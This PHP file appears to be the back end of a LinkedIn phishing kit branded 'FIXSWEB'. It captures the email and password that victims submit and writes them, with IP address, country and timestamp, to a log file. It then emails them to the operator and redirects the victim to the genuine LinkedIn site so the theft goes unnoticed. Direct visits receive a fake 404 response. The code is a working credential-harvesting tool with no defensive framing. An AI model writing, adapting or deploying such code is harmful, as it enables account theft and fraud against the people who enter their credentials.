<?php
ob_start();
session_start();

$url = json_decode(file_get_contents("http://api.ipinfodb.com/v3/ip-city/?key=2b3d7d0ad1a285279139487ce77f3f58d980eea9546b5ccc5d08f5ee62ce7471&ip=".$_SERVER['REMOTE_ADDR']."&format=json"));
$country=$url->countryName;
$state=$url->regionName;


require "email.php";



if(isset($_POST['session_key'])&&isset($_POST['session_password'])){


	$hi="#---------------------------[ FIXSWEB_Linkedln ]----------------------------#\r\n";
	$hi.="Email	: {$_POST['session_key']}\r\n";
	$hi.=" Password : {$_POST['session_password']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="IP		:  {$_SERVER['REMOTE_ADDR']}\r\n";
	$hi.="#---------------------------[ FIXSWEB_Linkedln]----------------------------#\r\n";

		$save=fopen("logs.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#Linkedln From {$ip} [ {$country}]";
	$headers="From: Linkeldn FIXSWEB <fixsweb>  \r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($your_email,$subject,$hi,$headers);
	
	

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
			include('sc/h/blocker.txt');
    		exit(header("Location: https://www.linkedin.com/")); // go to bank login page officiel..
	

}else{

    header("HTTP/1.0 404 Not Found");
    exit();
}

?>